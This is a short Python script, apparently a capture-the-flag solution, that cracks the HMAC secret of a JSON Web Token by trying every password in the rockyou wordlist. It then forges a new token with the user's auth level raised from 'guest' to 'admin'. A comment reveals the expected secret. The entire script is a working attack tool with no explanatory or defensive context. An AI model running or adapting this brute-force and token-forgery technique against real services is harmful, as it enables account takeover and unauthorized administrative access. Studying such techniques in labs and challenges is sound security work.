import jwt
import json
from tqdm import tqdm

encoded_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiYXV0aF9sZXZlbCI6Imd1ZXN0In0.dY2cCx0HdU4y36iHfrPYj6ojPha6ygr_m9S9sQQ1Cn4"

payload = {
  "username": "guest",
  "auth_level": "guest"
}

payload_final = {
    "username": "guest",
    "auth_level": "admin"
}

# should be done by rockyou but just for the sake of it pass="light_dragon123"

passw = ""
with open("rockyou.txt", "r", encoding='latin-1') as file:
    for line in tqdm(file.readlines(), total=14344392):
        jwt_test = jwt.encode(payload, line.strip(), algorithm="HS256")
        if(jwt_test == encoded_jwt):
            passw = line.strip()
            print(line)
            break

print(jwt.encode(payload_final, line.strip(), algorithm="HS256"))